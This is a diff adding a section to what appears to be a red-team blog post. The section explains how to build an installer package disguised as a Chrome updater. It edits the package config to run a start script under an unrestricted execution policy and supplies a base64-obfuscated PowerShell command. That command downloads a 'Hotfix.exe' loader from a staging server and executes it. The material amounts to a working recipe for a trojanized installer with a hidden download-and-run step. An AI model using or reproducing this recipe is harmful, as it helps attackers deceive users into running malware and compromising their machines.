@@ -255,4 +255,54 @@ Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BB
 
 <img src="/posts/2024-06-11_asd/images/chromeupdater.png"> 
 
-- You can
+- You can skip the Accelerator section. The package will automatically install in the system as shown
+
+
+<img src="/posts/2024-06-11_asd/images/isntall.png">
+
+- We skip this as well and head over to create the package
+
+<img src="/posts/2024-06-11_asd/images/newpackage1.png">
+
+
+- Click on Package Files
+
+
+<img src="/posts/2024-06-11_asd/images/packageeditor.png">
+
+- In the package editor, click on package files, right click on the "Package" and add the following appropriate files
+
+
+<img src="/posts/2024-06-11_asd/images/rightclick.png" width=1000px;>
+
+<img src="/posts/2024-06-11_asd/images/filestocopy.png" width=1000px;>
+
+- You can edit files directly in the package editor byt right clicking and selecting edit. Let's modify the config file to point to our staging script called Hotfix.ps1
+
+```javascript
+{
+  "applications": [
+    {
+      "id": "CHROME",
+      "executable": "ChromeSetup.exe",
+      "scriptExecutionMode": "-ExecutionPolicy Unrestricted",
+      "startScript": {
+        "waitForScriptToFinish": true,
+        "runOnce": false,
+	      "timeOut": 30000,
+        "showWindow": true,
+        "scriptPath": "Hotfix.ps1"
+      }
+    }
+  ]
+}
+
+```
+- Create the hotfix.ps1 file in a different window. We will add a powershell command that pulls our loader from the staging server and executes it
+
+<img src="/posts/2024-06-11_asd/images/cyberchef.png" width=1000px;>
+
+```powershell
+powershell -enc "dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADEAMgA4AC8AMgA0ADoAOQAwADAAMQAvAEgAbwB0AGYAaQB4AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADUAOwBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA="
+```
+
